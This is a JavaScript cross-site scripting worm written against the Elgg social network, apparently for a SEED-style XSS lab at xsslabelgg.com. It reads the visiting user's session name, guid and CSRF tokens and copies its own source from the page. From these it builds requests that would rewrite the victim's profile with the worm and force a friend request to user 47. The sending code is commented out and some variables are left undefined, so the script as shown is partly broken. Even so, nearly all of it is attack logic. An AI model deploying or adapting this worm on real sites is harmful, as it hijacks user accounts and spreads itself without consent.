<script id="worm" type="text/javascript">
window.onload = function() {
  var userName = elgg.session.user.name;
  var guid = "&guid="+elgg.security.token.__elgg_ts;
  var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
  var token = "&__elgg_token="+elgg.security.token.__elgg_token;
  var send_url = "http://www.xsslabelgg.com/action/profile/edit";
  var user_Guid = "&guid="+elgg.session.user.guid;
  var user_name="&name="+elgg.session.user.name;

  var worm_head = "<script id=\"worm\" type=\"text/javascript\">";
  var worm_logic = document.getElementById("worm").innerHTML;
  var worm_tail = "</script>"

  // var worm = encodeURIComponent(worm_head+worm_logic+worm_tail);
  alert(worm);
  // var content = '&description='+worm+'&accesslevel[description]=2&briefdescription=&accesslevel[briefdescription]=2&location=&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&twitter=&accesslevel[twitter]=2';

  var body = token+ts+user_name+content+user_Guid;
  var samyGuid = 47;
  if (elgg.session.user.guid!=samyGuid) {
    // var Ajax = null;
    // Ajax = new XMLHttpRequest();
    // Ajax.open("POST", send_url, true);
    // // Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
    // Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
    // Ajax.send(body);

    // var Ajax2 = null;
    // Ajax2 = new XMLHttpRequest();
    // var base_url = "http://www.xsslabelgg.com/action/friends/add?friend=47";
    // var send_url = base_url + ts + token;

    // Ajax2.open("GET", send_url, true);
    // Ajax2.setRequestHeader("Host", "www.xsslabelgg.com");
    // Ajax2.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
    // Ajax2.send();
  }
}
</script>